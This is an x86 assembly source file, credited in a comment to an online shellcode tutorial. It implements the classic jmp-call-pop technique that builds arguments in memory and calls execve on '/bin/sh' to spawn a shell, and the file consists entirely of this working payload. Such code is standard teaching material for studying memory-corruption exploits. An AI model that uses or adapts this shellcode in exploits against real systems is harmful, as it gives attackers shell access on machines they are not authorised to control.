section .text
global _start

;; ripped from http://www.vividmachines.com/shellcode/shellcode.html#linex3
_start:
  jmp short ender

starter:

  pop ebx                 ;get the address of the string
  xor eax, eax

  mov [ebx+7 ], al        ;put a NULL where the N is in the string
  mov [ebx+8 ], ebx       ;put the address of the string to where the
  ;AAAA is
  mov [ebx+12], eax       ;put 4 null bytes into where the BBBB is
  mov al, 11              ;execve is syscall 11
  lea ecx, [ebx+8]        ;load the address of where the AAAA was
  lea edx, [ebx+12]       ;load the address of the NULLS
  int 0x80                ;call the kernel, WE HAVE A SHELL!

ender:
  call starter
  db '/bin/shNAAAABBBB'
